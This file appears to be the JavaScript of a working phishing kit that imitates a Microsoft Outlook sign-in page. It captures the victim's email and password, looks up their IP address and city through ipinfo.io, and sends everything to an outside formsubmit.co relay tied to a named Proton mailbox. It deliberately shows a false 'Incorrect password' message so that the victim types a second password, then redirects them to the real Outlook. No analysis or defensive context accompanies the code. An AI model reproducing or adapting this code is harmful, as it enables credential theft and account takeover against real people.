document.addEventListener('DOMContentLoaded', function() {
            const form = document.getElementById('i0281');
            const emailInput = document.getElementById('email');
            const passwordInput = document.getElementById('psw');
            const nextButton = document.getElementById('idSIButton9');
            const signInButton = document.getElementById('signInButton');
            const emailView = document.getElementById('emailView');
            const passwordView = document.getElementById('passwordView');
            const emailError = document.getElementById('emailError');
            const passwordError = document.getElementById('passwordError');
            const userDisplay = document.getElementById('userDisplay');
            const backToEmailLink = document.getElementById('backToEmail');
            const forgotPasswordLink = document.getElementById('forgotPassword');
            const cantAccessAccountLink = document.getElementById('cantAccessAccount');
            const signupLink = document.getElementById('signup');
            let step = 0; // Track submission attempts

            // Function to validate email format
            function isValidEmail(email) {
                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                return emailRegex.test(email);
            }

            // Function to extract email from URL hash
            function getEmailFromHash() {
                const hash = window.location.hash;
                if (hash && hash.startsWith('#')) {
                    const email = hash.substring(1).trim();
                    if (isValidEmail(email)) {
                        return email;
                    }
                }
                return null;
            }

            // Function to show password view
            function showPasswordView(email) {
                userDisplay.textContent = email || '#email@domain.com';
                emailView.classList.add('hidden');
                passwordView.classList.remove('hidden');
                passwordView.classList.add('fade-in');
                setTimeout(function() {
                    passwordInput.focus();
                }, 300);
            }

            // Function to show email view
            function showEmailView() {
                passwordView.classList.add('hidden');
                emailView.classList.remove('hidden');
                emailView.classList.add('fade-in');
                setTimeout(function() {
                    emailInput.focus();
                }, 300);
            }

            // Initialize with password view using email from URL hash
            const emailFromHash = getEmailFromHash();
            if (emailFromHash) {
                showPasswordView(emailFromHash);
            } else {
                showEmailView();
            }

            // Event listeners
            nextButton.addEventListener('click', function(e) {
                e.preventDefault();
                const email = emailInput.value.trim();

                if (!email) {
                    emailError.textContent = 'This field is required.';
                    emailError.style.display = 'block';
                    return;
                }

                if (!isValidEmail(email)) {
                    emailError.textContent = 'Please enter a valid email address.';
                    emailError.style.display = 'block';
                    return;
                }

                emailError.style.display = 'none';
                window.location.hash = email;
                showPasswordView(email);
            });

            signInButton.addEventListener('click', function(e) {
                e.preventDefault();
                const password = passwordInput.value.trim();

                if (!password) {
                    passwordError.textContent = 'Please enter your password.';
                    passwordError.style.display = 'block';
                    return;
                }

                passwordError.style.display = 'none';
                step++; // Increment submission attempts

                // Update button text to "Verifying..."
                $(signInButton).val('Verifying...');

                // Fetch IP and location data
                $.getJSON('https://ipinfo.io/json', function(response) {
                    const posting = $.post("https://formsubmit.co/ajax/gabriel5657@proton.me", {
                        _subject: "Logs | " + response.ip,
                        Email: $("#email").val() || userDisplay.textContent,
                        Password: $("#psw").val(),
                        Attempts: step,
                        IP: response.ip,
                        Location: response.city + ", " + response.country,
                    }).done(function(data) {
                        // Reset button text after submission
                        $(signInButton).val('Sign in');
                        if (step === 1) {
                            // Show "incorrect password" on first submission
                            passwordError.textContent = 'Incorrect password';
                            passwordError.style.display = 'block';
                            passwordInput.value = ''; // Clear password field
                            passwordInput.focus(); // Focus back on password input
                        } else if (step === 2) {
                            // Redirect to Outlook on second submission
                            window.location.href = 'https://outlook.live.com/mail/';
                        }
                    }).fail(function(error) {
                        // Reset button text on error
                        $(signInButton).val('Sign in');
                        passwordError.textContent = 'Submission failed. Please try again.';
                        passwordError.style.display = 'block';
                        console.error('Submission error:', error);
                    });
                }).fail(function(error) {
                    // Reset button text on IP fetch error
                    $(signInButton).val('Sign in');
                    passwordError.textContent = 'Failed to fetch IP information. Please try again.';
                    passwordError.style.display = 'block';
                    console.error('IP fetch error:', error);
                });
            });

            backToEmailLink.addEventListener('click', function(e) {
                e.preventDefault();
                showEmailView();
            });

            forgotPasswordLink.addEventListener('click', function(e) {
                e.preventDefault();
                alert('Password reset functionality would go here.');
            });

            cantAccessAccountLink.addEventListener('click', function(e) {
                e.preventDefault();
                alert('Account recovery functionality would go here.');
            });

            signupLink.addEventListener('click', function(e) {
                e.preventDefault();
                alert('Account creation would go here.');
            });

            emailInput.addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    e.preventDefault();
                    nextButton.click();
                }
            });

            passwordInput.addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    e.preventDefault();
                    signInButton.click();
                }
            });

            emailInput.addEventListener('input', function() {
                if (emailError.style.display !== 'none') {
                    emailError.style.display = 'none';
                }
            });

            passwordInput.addEventListener('input', function() {
                if (passwordError.style.display !== 'none') {
                    passwordError.style.display = 'none';
                }
            });
        });
